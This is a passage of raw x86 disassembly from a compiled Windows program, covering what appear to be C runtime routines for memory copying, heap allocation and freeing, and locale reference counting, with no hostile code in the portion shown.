  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
